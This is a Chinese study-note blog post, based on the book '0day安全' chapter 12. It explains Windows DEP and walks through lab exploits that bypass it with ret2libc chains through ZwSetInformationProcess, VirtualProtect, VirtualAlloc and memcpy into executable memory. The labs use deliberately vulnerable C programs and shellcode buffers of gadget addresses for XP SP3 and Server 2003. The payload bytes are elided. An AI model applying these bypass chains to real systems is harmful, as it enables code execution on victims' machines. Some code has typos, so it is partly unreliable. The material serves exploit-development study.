---

title: 数据与程序的分水岭:DEP
date: 2018-03-16
categories: 
tags:
	- 《0day2》

---

# 0x00 DEP 基址保护原理

 Vista 下边经过/NXcompat 选项编译过的程序将自动应用 DEP。

/NXCOMPAT 是 Visual Studio 2005 及后续版本中引入一个链接选项，默认情况 下是开启的。

可以在通过菜单中的 Project→ project Properties →Configuration Pr operties→Linker→Advanced→Data Ex ecution Prevention (DEP)中选择是不是使用/NXCOMPAT 编译程序。

Windows XP SP2 开始提供这种技术支持DEP。

硬件 DEP 才是真正意义的 DEP，硬件 DEP 需要 CPU 的支持。

特殊的标识位(NX/XD)来标识是 否允许在该页上执行指令。

当该标识位设置为 0 里表示这个页面允许执行指令，设置为 1 时表 示该页面不允许执行指令。

## 相关设置

Optin:默认仅将 DEP 保护应用于 Windows 系统组件和服务，对于其他程序不予保护.

这种模式可以被应用 程序动态关闭, 它多用于普通用户版的操作系统，如 Windows XP、Windows Vista、Windows7

Optout:为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中 指定不启用 DEP 保护的程序和服务。

这种模式可以被应用程序动态关闭，它多用于服务器版 的操作系统，如 W indows 2003、Windows 2008。

AlwaysOn:对所有进程启用 DEP 的保护，不存在排序列表，DEP 不可以被关闭，目前只有在 64 位的操作系统上才工作在 AlwaysOn 模式。

AlwaysOff:对所有进程都禁用 DEP，DEP 也不能被动态开启，这种模 式一般只有在某种特定场合才使用，如 DEP 干扰到程序的正常运行。

![pwned](dep/option.png)



/NXCOMPAT 是 Visual Studio 2005 及后续版本中引入一个链接选项，默认情况 下是开启的
采用/NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_ NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译

经过/NXCOMPAT 编译的程序在 Windows vista 及后续版本的操作系统 上会自动启用 DEP 保护。
/NXCOMPAT 编译选项 只有在Windows Vista 以上的系统有效。

当 DEP 工作在最主要的两种状态 Optin 和 Optout 下时，DEP 是可以被动态关闭和 开启的，这就说明操作系统提供了某些 API 函数来控制 DEP 的状态。同样很不幸的是早期的 操作系统中对这些 API 函数的调用没有任何限制，所有的进程都可以调用这些 API 函数

# 0x01 攻击未开启DEP的程序

思路：

微软要考虑兼容性的问题，所以不能对所有进程强制开启 DEP(64 位下的 AlwaysOn 除外)。
DEP 保护对象是进程级的，当某个进程的加载模块中只要 有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。

这种攻击手段不与 DEP 有着正面冲突，只是一种普通的溢出攻击。

![win7_no_dep](dep/win7_no_dep.png)



# 0x02 利用 Ret2Libc 挑战 DEP

三种经过改进的、相对比较有效的绕过 DEP的 exploit 方法：

1. 通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行。
2. 通过跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态，然后再 转入 shellcode 执行。
3. 通过跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复 制到这段内存中执行。


## Ret2Libc 实战之利用 ZwSetInformationProcess

进程的 DEP 设置标识保存在 KPROCESS 结构中的_KEXECUTE_OPTIONS 上，

而这 个标识可以通过 API 函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和 修改。

(在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformationProcess，
在 Ntdll.dll 中 Nt** 函数和 Zw** 函数功能是完全一样的，本书中我们统一称 之为 Zw**。)

_KEXECUTE_OPTIONS 结构体

```C
_KEXECUTE_OPTIONS{
    Pos0ExecuteDisable :1bit
    Pos1ExecuteEnable :1bit
    Pos2DisableThunkEmulation :1bit
    Pos3Permanent :1bit
    Pos4ExecuteDispatchEnable :1bit
    Pos5ImageDispatchEnable :1bit
    Pos6Spare :2bit 
}
```

当前进程 DEP 开启时 ExecuteDisable 位被置 1，
当前进程 DEP 关闭时 ExecuteEnable  位被置 1，
DisableThunkEmulation 是为了兼容ATL程序设置的， 
Permanent 被置 1 后表示这些标志都不能再被修改。
真正影响 DEP 状态是前两位，所以我们只 要将_KEXECUTE_OPTIONS 的值设置为 0x02(二进制为 00000010)就可以将 ExecuteEnable 置为 1。

关键函数 NtSetInformationProcess

```C
ZwSetInformationProcess(
    IN HANDLE ProcessHandle,                                //-1 表示当前进程
    IN PROCESS_INFORMATION_CLASS ProcessInformationClass, 	//信息类
    IN PVOID ProcessInformation,							//用来设置_KEXECUTE_OPTIONS
    IN ULONG ProcessInformationLength 						//第三个参数的长度
);
```

Skape 和 Skywing 在他们的论文 Bypassing Windows Hardware-Enforced DEP 中给出了关闭 DEP 的参数设置。

```c
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
ZwSetInformationProcess(
    NtCurrentProcess(),			// (HANDLE)-1
    ProcessExecuteFlags,		// 0x22
    &ExecuteFlags,				// ptr to 0x2
    sizeof(ExecuteFlags)		// 0x4
);
```

问题：参数中会有\x00阶段，可以在系统中找已经构造好的参数(如果系统存在一处关闭EBP的调用)。

如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。 为此微软设立了 LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的 DEP 会被关闭:

1. 当 DLL 受 SafeDisc 版权保护系统保护时; 
2. 当 DLL 包含有.aspcak、.pcle、.sforce 等字节时;
3. WindowsVista 下面当DLL包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”键下边标识 出不需要启动DEP的模块时。

![dep_ flow](dep/dep_ flow.png)

###环境

xp sp3

DEP状态 Optout

VC++6.0	禁用优化 release版本

### 思路

![aa](dep/aa.png)

① 通过OD插 OllyFindAddr ，Disable DEP→Disable DEP <=XP SP3 搜索结果的Step2部分就是符合要求的指令。

② 程序需要在 EBP-4 位置写入数据 ， 但是 EBP-4 被我们覆盖了junk数据 无法写入， 需要将EBP指向一个可以写位置，观察寄存器，只有esp能够使用。

我们可以通过类似 PUSH ESP POP EBP RETN 的指令将 EBP 定位到一个可写的位置，OllyFindAddr 插件 Disable DEP <=XP SP3 搜索结果的 Setp3 部分查看 当前内存中所有符合条件的指令。

③ 第二步中 EBP-4 写入的数据 会被NtSetInformationProcess 的参数 冲刷掉：

一般情况下，当ESP值小于EBP时，防止入栈时破坏当前栈内内容的调整方法：

1. 减小ESP
2. 增大EBP

增大EBP 找不到 , 减小ESP 会破坏shellcode

一个变通的方法：让 EBP 和 ESP之间的空间足够大，

我们可以通过 OllyFindAddr 插件中的 Overflow return address-> POP RETN+N 选项来查找相关指令。

（参数：pop=0， ret=28）

被冲刷之后：

![ebp-4_b](dep/ebp-4_b.png) 

被冲刷之前：

![ebp-4_a](dep/ebp-4_a.png)

④ 关闭EBP之后 ， 0x7C93D6f  retn 4下断点  ， 发现指向我们能够控制的区域

可以通过 OllyFindAddr 插件中的 Overflow return address→Find CALL/JMP ESP

跳回shellcode执行， 但是距离太远， 我们可以再 esp 处覆盖我们的跳板，跳回shellcode。



![pwned](dep/pwned.png)

### 代码

```c
#include<stdlib.h>
#include<string.h>
#include<stdio.h>
#include<windows.h>
charshellcode[] = 
    			"\xFC\x68\x6A\x0A........"//弹窗机器码
    			"\x90\x90\x90\x90"//填充 
    			"\x52\xE2\x92\x7C"//MOV EAX,1 RETN地址
				"\x85\x8B\x1D\x5D"//修正 EBP
				"\x19\x4A\x97\x7C"//增大 ESP    pop retn 0x38
				"\xB4\xC1\xC5\x7D"//jmp esp
				"\x24\xCD\x93\x7C"//关闭 DEP 代码的起始位置 
				"\xE9\x33\xFF\xFF"//回跳指令
				"\xFF\x90\x90\x90"
void test(){
    chartt[176];
    strcpy(tt,shellcode);
} 
int main() {
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
	test();
	return 0;
}
```

补充 windows 2003 xp2 修改了LdrpCheckNXCompatibility ， 影响最大的就是会对ESI指向的内存读写，

可以使用下面的代码 但是不好找

```
push esp pop esi retn
```

(1)找到 pop eax retn 指令，并让程序转入该位置执行。

(2)找到一条 pop esi retn 的指令并保证在执行(1)中 pop eax 时它的地址位于栈顶，就可以把该地址放到eax 中。

(3)找到 push esp jmp eax 指令，并转入执行。

这样就相当于执行了 push esp pop esi retn，esi 被指到了可写位置

```
“........“    //弹框机器码
"\x90\x90\x90\x90 ........."
"\x94\xb3\x97\x7c"//MOV EAX,1 RETN地址 0x7c97b394
"\xe4\xa3\xca\x77" // push esp pop ebp retn 4  0x77caa3e4
"\x81\x71\xba\x7c"// pop eax retn  0x7cba7181
"AAAA"
"\x72\xe5\xb9\x7c"// pop esi retn 0x7cb9e572
"\xbf\x7d\xc9\x77" // push esp jmp eax 0x77c97dbf
"\x3c\x15\xb9\x7c"// retn 0x30  0x7cb9153c
"\x8d\x1b\x80\x7c "//关闭 DEP 代码的起始位置  0x7c801b8d
"\xE9\x33\xFF\xFF"//回跳指令
"\xFF\x90\x90\x90"
```

(当前eip)pop eax ret

(esp指向的位置)  pop eax (eax 希望执行的指令的地址)   (后面ret)	

push esp jmp eax

希望执行的目标的地址	后esp的位置	

push esp jmp eax 跳转前后的情况：

![jmp1](dep/jmp1.png)

![jmp2](dep/jmp2.png)

### 参考

《0day安全软件漏洞分析技术第二版》第12章



## Ret2Libc 实战之利用 VirtualProtect

Optout 和 AlwaysON 模式下所有进程是默认开启 DEP，这时 候如果一个程序自身偶尔需要从堆栈中取指令，则会发生错误。

为了解决这个问题微软提供了 修改内存属性的 VirtualProtect 函数，该函数位于 kernel32.dll 中，通过该函数用户可以修改指定内存的属性，包括是否可执行属性。

因此只要我们在栈帧中布置好合适的参数，并让程序转入 VirtualProtect 函数执行，就可以将 shellcode 所在内存设置为可执行状态，进而绕过 DEP

MSDN 上对 VirtualProtect 函数的说明:    修改内存属性成功时函数返回非 0，修改失败时返回 0。

```c
BOOL VirtualProtect(
  LPVOID lpAddress,     //要改变属性的内存起始地址
  DWORD dwSize,			//要改变属性的内存区域大小
  DWORD flNewProtect,	//内存类型设置为PAGE_EXECUTE_READWRITE(0x40)时该内存页为可读可写可执行。
  PDWORD lpflOldProtect	//内存原始属性类型保存地址
);
```

![virtualprotect](dep/virtualprotect.png)

### 环境

windows 2003 sp2

EDP Optout

VC++6.0   关闭GS 优化选项 SafeSEH

```c
//关闭 safeSEH ， Visual Studio 2003 及后续版本中是默认启用
BOOL APIENTRY DllMain( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved){
    return TRUE;
}
```

### 思路

如果我们能够按照如下参数布置好栈帧的话就可以将 shellcode 所在内存区域设置为可执行模式。

```c
BOOL VirtualProtect( 
    shellcode 所在内存空间起始地址, 
    shellcode 大小,
	0x40,
	某个可写地址
);
```

1. 参数中包含 0x00，strcpy 在复制字符串的时候会被截断，改为攻击 memcpy 函数。
2. 对 shellcode 所在内存空间起始地址的确定。

### 代码

```c
#include<stdlib.h>
#include<string.h>
#include<stdio.h>
#include<windows.h>
char shellcode[]= 
    		"\x90\x90\x90\x90....."
    		"\x8A\x17\x84\x7C"// ④pop eax ret
            "\x0A\x1A\xBF\x7C"// ⑤pop pop pop ret
            "\xBA\xD9\xBB\x7C"// ① 修正EBP ， 覆盖ret  push esp pop ebp retn 4
            "\x8B\x17\x84\x7C"// ②ret
            "\x90\x90\x90\x90"
            "\xBF\x7D\xC9\x77"// ③push esp jmp eax
            "\xFF\x00\x00\x00"//函数参数， 修改内存的大小
            "\x40\x00\x00\x00"//可读可写可执行内存属性代码
            "\xBF\x7D\xC9\x77"// ⑥push esp jmp eax
            "\x90\x90\x90\x90"
            "\x90\x90\x90\x90"
            "\xE8\x1F\x80\x7C"// ⑦修改内存属性函数压入参数的地址  注意retn 0x10
            "\x90\x90\x90\x90"
            "\xA4\xDE\xA2\x7C"// ⑧jmp esp
            "\x90\x90\x90\x90"
            "\x90\x90\x90\x90"
            "\x90\x90\x90\x90"
            "\x90\x90\x90\x90"
			"\xFC\x68\x6A\x0A ......" // 弹框shellcode
void test(){
       char str[176];
       memcpy(str,shellcode,420);
} 
int main() {
       HINSTANCE hInst = LoadLibrary("shell32.dll");
       char temp[200];
       test();
       return 0; 
}
```

①  在test函数返回是 pop ebp ， 这个被我们覆盖了，所以 push esp pop ebp retn 4 修复 ebp

需要注意选择的指令中不能修改 ESP、EBP、EAX 

② 修复ebp ,retn4 后 esp指向ebp+8 的位置， ret 指向ebp+c ,  才能push到ebp+8

③  push esp 后 压入当前esp 即 lpAddress(要改变属性的内存起始地址)  , 

eax 还保留着 memcpy 返回地址(shellcode首地址) ，jmp 跳到 shellcode。

④ pop eax 保存 下次jmp eax 要执行的地址。

⑤ esp 指向下移

![VirtualProcite_retn](dep/VirtualProcite_retn.png)

### 参考

《0day安全软件漏洞分析技术第二版》12.3.2节



## Ret2Libc 实战之利用 VirtualAlloc

当程序需要一段可执行内存时，可以通过 kernel32.dll 中的 VirtualAlloc 函数来申请一段具有可 执行属性的内存。我们就可以将 Ret2Libc 的第一跳设置为 VirtualAlloc 函数地址，然后将 shellcode 复制到申请的内存空间里，以绕过 DEP 的限制。

```c
// MSDN 上的 VirtualAlloc函数说明
LPVOID WINAPI VirtualAlloc( 
    __in_opt LPVOID lpAddress,		
    //申请内存区域的地址，如是NULL，系统会决定分配内存区域的位置，并且按64KB向上取整。
    __in SIZE_T dwSize,				//申请内存区域的大小。
    __in DWORD flAllocationType, 	//申请内存的类型
    __in DWORD flProtect			//申请内存的访问控制类型，如读、写、执行等权限。
);
```

申请成功返回地址，失败返回NULL。

### 环境

windows 2003 sp2

DEP Optout

VC++6.0 禁用优化，release版本。

关闭 GS 和 SafeSEH

### 思路

VirtualAlloc函数中对各参数的调用与VirtualProtect 函数如出一辙，可以选择与上个实验中一致的参数构造方法。

但是VirtualAlloc不存在动态确认地址的问题，可以直接写到shellcode里。

![virtualAlloc](dep/virtualAlloc.png)

1. lpAddress=0x00030000	选择一个未被占用的地址即可。
2. dwSize=0xFF，申请空间的大小可以根据 shellcode 的长度确定。
3. flAllocationType=0x00001000，该值使用 0x00001000 即可， 如有特殊需求查看MSDN。
4. flProtect=0x00000040，内存属性要设置为可读可写可执行。MSDN介绍改值为0x40。

### 代码

	#include<stdlib.h>
	#include<string.h>
	#include<stdio.h>
	#include<windows.h>
	char shellcode[]=
	"\x90\x90\x90\x90 ........ "
	"\x99\xc8\xa7\x7c"  //① 0x7ca7c899 push esp pop ebp retn 4 - > 覆盖的返回地址
	"\xbc\x45\x82\x7c"	//② 0x7c8245bc  VirtualAlloc
	"\x90\x90\x90\x90"
	//------------------------------   VirtualAlloc 函数参数
	"\xFF\xFF\xFF\xFF"//-1 当前进程
	"\x00\x00\x03\x00"//申请空间起始地址 0x00030000 
	"\xFF\x00\x00\x00"//申请空间大小 0xFF
	"\x00\x10\x00\x00"//申请类型 0x1000 
	"\x40\x00\x00\x00"//申请空间访问类型 0x40
	//-------------------------------
	"\x90\x90\x90\x90"
	"\xf0\xf3\x87\x7c" //③ 0x7c87f3f0	pop eax retn
	
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"//VirtualAlloc retn 0x10
	
	"\xe6\x7e\x80\x7c"  //⑦ 0x7c807ee6  pop pop retn
	"\x99\xc8\xa7\x7c"  //④ 0x7ca7c899 push esp pop ebp retn 4
	"\xe7\x7e\x80\x7c"  //⑤ 0x7c807ee7  pop retn ，下移esp ，指向 memcpy在栈上的第二个参数
	
	"\x00\x00\x03\x00"//⑨ 可执行内存空间地址，转入执行用
	
	//-------------------------------  		memcpy 函数参数
	"\x00\x00\x03\x00"//可执行内存空间地址，memcpy复制用
	"\xbf\x7d\xc9\x77"//⑥0x77c97dbf push esp jmp eax
	"\xFF\x00\x00\x00"//shellcode 长度
	//-------------------------------
	"\xac\xaf\x94\x7c"//⑧ 0x7c94afac memcpy，结束时会有leave指令，将ebp赋值给esp，向低地址移动
	//mov esp,ebp                                            
	//pop ebp
	
	//------------------------------- memcpy 结束时会pop esi 和 edi，shellcode需要读写这两个地址
	"\x00\x00\x03\x00"//一个可以读地址
	"\x00\x00\x03\x00"//一个可以读地址
	
	//------------------------------- 
	//被复制进来的机器码，会执行XCHG eax,esp ， shellcode需要使用push ，所以 ESP 要修复，使用机器码94
	//使用 \x90 解决将shellcode 和 额外复制进来的代码，识别成一条指令问题。 
	"\x00\x90\x90\x94"
	"........" //shellcode 
	void test()
	{
	       char tt[176];
	       memcpy(tt,shellcode,450);
	} 
	int main() {
	       HINSTANCE hInst = LoadLibrary("shell32.dll");
	       char temp[200];
	       test();
	       return 0; 
	}
① DEP在溢出中被破坏，需要 push esp pop ebp retn 4 修复。

② VirtualAlloc 函数 ，retn 0x10

![virtualAlloc_1](dep/virtualAlloc_1.png)

③ 设置 eax 值为 ⑦ 的地址

④ 修复 ebp ， memcpy 会用到 ebp。

⑤ 下移esp ，到⑥的位置

⑥设置 memcpy参数，jmp eax 到 ⑦的位置

memcpy 函数位于 ntdll.dll，需要三个参数，依次为目的内存起始地址、源内存起始地址、复制长度

切入点 : memcpy 函数中 MOV ESI,DWORD PTR SS:[EBP+C]  指令地址。

![virtualAlloc_2](dep/virtualAlloc_2.png)

⑦ 下移esp，到⑧的位置

⑧ 执行memcpy函数，返回时有leave 移动esp到低地址， 直接跳到 ⑨ retn 执行 shellcode。

修复代码

![virtualAlloc_1](dep/virtualAlloc_1.png)

### 参考

《0day安全软件漏洞分析技术第二版》12.3.3节



# 0x03 利用可执行内存挑战 DEP

如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程

![rwe_1](dep/rwe_1.png)

### 环境

windows 2003 sp2

DEP Optout

VC++6.0 禁用优化选项， release ， 关闭GS 和 SafeSEH

### 思路

假使被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过 memcpy 函数将 shellcode 复制到这段内存区域中执行。

### 代码

```c
#include<stdlib.h>
#include<string.h>
#include<stdio.h>
#include<windows.h>
char shellcode[]=
    "\x90\x90\x90\x90........"
	"\xfb\xe4\x87\x7c"  // pop eax 0x7c87e4fb
	"\x3e\x93\xbf\x7c" // 0x7cbf933e pop pop ret
	"\x99\xc8\xa7\x7c" //0x7ca7c899  push esp pop ebp ret 4 
	"\xd6\x89\x87\x7c" // 0x7c8789d6 pop ecx retn 
	"\x07\x00\x14\x00"	// shellcode
	"\x00\x00\x14\x00"//可执行内存空间地址，复制用 
	"\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址 
	"\xFF\x00\x00\x00"//复制长度
	"\xAC\xAF\x94\x7C"//memcpy
	"shellcode ......."
void test(){
	   char tt[176];
	   memcpy(tt,shellcode,450);
} 
int main() {
       HINSTANCE hInst = LoadLibrary("shell32.dll");
       char temp[200];
       test();
	   return 0; 
}

```

```C
"\xfb\xe4\x87\x7c"  // pop eax  0x7c87e4fb ①保存eax值
"\x3e\x93\xbf\x7c" // 0x7cbf933e pop pop ret ⑤下移指针 ，ret memcpy
"\x99\xc8\xa7\x7c" //0x7ca7c899  ②push esp pop ebp ret 4 
"\xd6\x89\x87\x7c" // 0x7c8789d6 pop ecx retn//③下移esp指针，ret ④ push esp jmp eax 
"\x07\x00\x14\x00”  //  ⑦ memcpy 执行完 leave ret 执行的地址
```
```C
"\x00\x00\x14\x00"//可执行内存空间地址，复制用 
"\xBF\x7D\xC9\x77”//push esp jmp eax && 原始 shellcode 起始地址， ④设置 参数，接触执行流
"\xFF\x00\x00\x00"//复制长度
```
```C
"\xAC\xAF\x94\x7C”//⑥memcpy ， ret到⑦shellcode 
```
### 参考

《0day安全软件漏洞分析技术第二版》12.4节





























